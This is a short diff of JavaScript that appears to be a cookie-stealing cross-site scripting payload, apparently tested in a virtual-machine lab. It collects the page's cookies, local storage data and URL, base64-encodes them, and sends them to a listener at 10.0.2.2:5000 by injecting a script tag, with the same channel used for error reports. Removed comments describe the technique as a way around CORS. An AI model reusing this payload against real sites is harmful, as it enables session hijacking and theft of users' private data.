@@ -17,17 +17,14 @@
         var rawData = "Cookies: " + cookie + " | Local: " + localData + " | URL: " + location;
         var data = safeBtoa(rawData);
         
-        // Change 1: Drop XHR entirely. Create a script element instead.
         var scriptTag = document.createElement('script');
         
-        // Change 2: Set the source to your Python listener
+        // using IP 10.0.2.2 to reach from VM to host machine
         scriptTag.src = "http://10.0.2.2:5000/log?data=" + data;
         
-        // Change 3: Injecting it into the document forces the GET request instantly, bypassing CORS
         document.head.appendChild(scriptTag);
 
     } catch (err) {
-        // Apply the same fix to the error reporter
         var errorData = safeBtoa("CRASH: " + err.message);
         var errScript = document.createElement('script');
         errScript.src = "http://10.0.2.2:5000/log?data=" + errorData;
